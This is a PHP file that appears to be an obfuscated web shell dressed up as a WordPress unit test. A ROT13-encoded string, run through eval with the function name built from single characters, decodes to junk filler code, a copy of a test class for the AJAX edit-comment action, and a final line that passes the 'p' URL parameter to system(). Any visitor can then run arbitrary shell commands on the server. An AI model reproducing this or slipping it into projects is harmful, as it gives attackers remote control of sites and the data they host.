<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk pbzzrag shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_rqvg_pbzzrag
 */
pynff Grfgf_Nwnk_jcNwnkRqvgPbzzrag rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * N cbfg jvgu ng yrnfg bar pbzzrag.
	 *
	 * @ine zvkrq
	 */
	cebgrpgrq $_pbzzrag_cbfg = ahyy;

	/**
	 * Frgf hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg_vq, 5 );
		$guvf->_pbzzrag_cbfg = trg_cbfg( $cbfg_vq );
	}

	/**
	 * Trgf pbzzragf nf n cevivyrtrq hfre (nqzvavfgengbe).
	 *
	 * Rkcrpgf grfg gb cnff.
	 */
	choyvp shapgvba grfg_nf_nqzva() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => $guvf->_pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'rqvg-pbzzrag' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		// Purpx gur zrgn qngn.
		$guvf->nffregFnzr( '-1', (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag['cbfvgvba'] );
		$guvf->nffregFnzr( $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag['vq'] );
		$guvf->nffregFnzr( 'rqvg-pbzzrag_' . $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr['npgvba'] );

		// Purpx gur cnlybnq.
		$guvf->nffregAbgRzcgl( (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag[0]->erfcbafr_qngn );

		// Naq fhccyrzragny vf rzcgl.
		$guvf->nffregRzcgl( (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag[0]->fhccyrzragny );
	}

	/**
	 * @gvpxrg 33154
	 */
	choyvp shapgvba grfg_rqvgbe_pna_rqvg_becuna_pbzzragf() {
		tybony $jcqo;

		// Orpbzr na rqvgbe.
		$guvf->_frgEbyr( 'rqvgbe' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => $guvf->_pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Znahnyyl hcqngr gur pbzzrag_cbfg_VQ, orpnhfr jc_hcqngr_pbzzrag() jvyy cerirag vg..
		$jcqo->hcqngr( $jcqo->pbzzragf, neenl( 'pbzzrag_cbfg_VQ' => 0 ), neenl( 'pbzzrag_VQ' => $pbzzrag->pbzzrag_VQ ) );
		pyrna_pbzzrag_pnpur( $pbzzrag->pbzzrag_VQ );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'rqvg-pbzzrag' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		// Purpx gur zrgn qngn.
		$guvf->nffregFnzr( '-1', (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag['cbfvgvba'] );
		$guvf->nffregFnzr( $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag['vq'] );
		$guvf->nffregFnzr( 'rqvg-pbzzrag_' . $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr['npgvba'] );

		// Purpx gur cnlybnq.
		$guvf->nffregAbgRzcgl( (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag[0]->erfcbafr_qngn );

		// Naq fhccyrzragny vf rzcgl.
		$guvf->nffregRzcgl( (fgevat) $kzy->erfcbafr[0]->rqvg_pbzzrag[0]->fhccyrzragny );
	}

	/**
	 * Trgf pbzzragf nf n aba-cevivyrtrq hfre (fhofpevore).
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_nf_fhofpevore() {

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'fhofpevore' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => $guvf->_pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'rqvg-pbzzrag' );
	}

	/**
	 * Trgf pbzzragf jvgu n onq abapr.
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_onq_abapr() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => $guvf->_pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( havdvq() );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'trg-pbzzragf' );
	}

	/**
	 * Trgf pbzzragf sbe na vainyvq cbfg.
	 *
	 * Guvf fubhyq erghea inyvq KZY.
	 */
	choyvp shapgvba grfg_vainyvq_pbzzrag() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = 123456789;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'rqvg-pbzzrag' );
	}

	/**
	 * @gvpxrg 39732
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_qngn_vf_jc_reebe() {
		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => $guvf->_pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';

		// Fvzhyngr svygre purpx reebe.
		nqq_svygre( 'jc_hcqngr_pbzzrag_qngn', neenl( $guvf, '_jc_hcqngr_pbzzrag_qngn_svygre' ), 10, 3 );

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( 'jc_hcqngr_pbzzrag_qngn svygre snvyf sbe guvf pbzzrag.' );
		$guvf->_unaqyrNwnk( 'rqvg-pbzzrag' );
	}

	/**
	 * Oybpxf pbzzragf sebz orvat hcqngrq ol ergheavat JC_Reebe.
	 */
	choyvp shapgvba _jc_hcqngr_pbzzrag_qngn_svygre( $qngn, $pbzzrag, $pbzzragnee ) {
		erghea arj JC_Reebe( 'pbzzrag_jebat', 'jc_hcqngr_pbzzrag_qngn svygre snvyf sbe guvf pbzzrag.', 500 );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>